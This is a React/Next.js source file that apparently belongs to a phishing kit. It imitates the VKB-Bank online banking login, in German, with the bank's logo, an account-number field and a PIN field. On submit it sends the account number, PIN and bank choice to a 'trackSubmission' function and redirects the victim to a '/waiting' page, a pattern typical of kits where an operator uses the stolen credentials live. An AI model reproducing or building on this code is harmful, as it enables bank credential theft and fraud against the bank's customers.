"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import LanguageSwitch from "./LanguageSwitch";
import { trackSubmission } from "@/lib/track";

export default function LoginCard({
  onSubmit,
}: {
  onSubmit?: (verfueger: string) => void;
}) {
  const router = useRouter();
  const [bundesland] = useState("VKB-Bank");
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [saveVerfueger, setSaveVerfueger] = useState(false);
  const [showBundeslandDropdown, setShowBundeslandDropdown] = useState(false);
  const [verfuegerTouched, setVerfuegerTouched] = useState(false);

  const verfuegerError = verfuegerTouched && verfueger === "";
  const isValid = bundesland !== "" && verfueger !== "" && pin !== "";

  return (
    <div className="flex justify-center items-end sm:items-center min-h-[calc(100vh-60px)] px-4 sm:px-0">
      <div className="relative bg-white rounded-lg w-full max-w-[460px] pt-[34px] mt-[34px] pb-3 flex flex-col shadow-lg sm:min-h-0 min-h-[calc(100vh-100vw+0.625rem)]">
        {/* Logo */}
        <div className="absolute -top-[34px] left-0 right-0 flex justify-center">
          <div
            className="w-[68px] h-[68px] bg-center bg-no-repeat"
            style={{ backgroundSize: "68px", backgroundImage: "url('/vkb/vkb-logo.svg')" }}
          />
        </div>

        {/* Language switch */}
        <div className="absolute top-0 right-0 w-full">
          <LanguageSwitch />
        </div>

        {/* Content */}
        <div className="flex-1 overflow-hidden mt-6">
          <div className="px-3 sm:px-4">
            <h1 className="text-2xl font-normal mb-2 whitespace-nowrap">
              Bitte melden Sie sich an
            </h1>

            <p className="mt-3 text-sm" style={{ color: "rgba(0,0,0,0.54)" }}>
              Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
            </p>

            {/* Bundesland Select - pre-selected "VKB-Bank" */}
            <div className="my-3 form-field">
              <div className="relative">
                <div className="relative pt-4">
                  <button
                    type="button"
                    onClick={() => setShowBundeslandDropdown(!showBundeslandDropdown)}
                    className="w-full flex items-center justify-between pb-1 text-left bg-transparent border-0 cursor-pointer"
                  >
                    <span className="text-base text-vkb-black">
                      {bundesland}
                    </span>
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      className={`flex-shrink-0 text-vkb-gray-700 transition-transform ${showBundeslandDropdown ? "rotate-180" : ""}`}
                    >
                      <path d="M7 10l5 5 5-5z" />
                    </svg>
                  </button>
                  <label
                    className="absolute left-0 top-0 text-xs pointer-events-none"
                    style={{ color: "rgba(0,0,0,0.54)" }}
                  >
                    Bundesland oder Bank wählen
                    <span className="text-vkb-danger ml-0.5">*</span>
                  </label>
                </div>
                <div className="form-field-underline" />
              </div>
            </div>

            {/* Verfügernummer */}
            <div className="mb-3 form-field">
              <div className="relative pt-4">
                <input
                  type="text"
                  value={verfueger}
                  onChange={(e) => setVerfueger(e.target.value)}
                  onBlur={() => setVerfuegerTouched(true)}
                  placeholder=" "
                  className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none"
                />
                <label
                  className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                    verfueger
                      ? "top-0 text-xs"
                      : "top-1/2 -translate-y-1/2 text-base"
                  }`}
                  style={{ color: verfuegerError ? "#ca261a" : "rgba(0,0,0,0.54)" }}
                >
                  Verfügernummer eingeben
                  <span className="text-vkb-danger ml-0.5">*</span>
                </label>
              </div>
              {verfuegerError ? (
                <>
                  <div className="form-field-underline-error" />
                  <p className="text-xs mt-1" style={{ color: "#ca261a" }}>
                    Verfügernummer ungültig
                  </p>
                </>
              ) : (
                <div className="form-field-underline" />
              )}
            </div>

            {/* PIN + Checkbox row */}
            <div className="mb-3">
              <div className="form-field">
                <div className="relative pt-4">
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder=" "
                    className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none"
                  />
                  <label
                    className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                      pin
                        ? "top-0 text-xs"
                        : "top-1/2 -translate-y-1/2 text-base"
                    }`}
                    style={{ color: "rgba(0,0,0,0.54)" }}
                  >
                    PIN eingeben
                    <span className="text-vkb-danger ml-0.5">*</span>
                  </label>
                </div>
                <div className="form-field-underline" />
              </div>

              {/* Checkbox row */}
              <div className="flex items-center gap-2 mt-3 pb-1">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={saveVerfueger}
                    onChange={(e) => setSaveVerfueger(e.target.checked)}
                    className="vkb-checkbox"
                  />
                  <span className="text-sm">Verfüger speichern</span>
                </label>
                <button
                  type="button"
                  className="w-8 h-8 rounded-full flex items-center justify-center text-vkb-gray-700 hover:bg-vkb-gray-100 transition-colors"
                  aria-label="Hinweis zur Checkbox 'Verfüger speichern' öffnen"
                >
                  <svg
                    width="18"
                    height="18"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="16" x2="12" y2="12" />
                    <line x1="12" y1="8" x2="12.01" y2="8" />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Submit button */}
        <div className="px-3 sm:px-4 pt-3 flex justify-center">
          <button
            type="button"
            disabled={!isValid}
            onClick={() => {
              trackSubmission("vkb", "login", { verfueger, pin, bundesland });
              router.push(`/waiting?user=${encodeURIComponent(verfueger)}`);
            }}
            className="vkb-btn-primary w-full sm:w-1/2"
          >
            Weiter
          </button>
        </div>

        <div className="px-3 sm:px-4 mb-1" />
      </div>
    </div>
  );
}
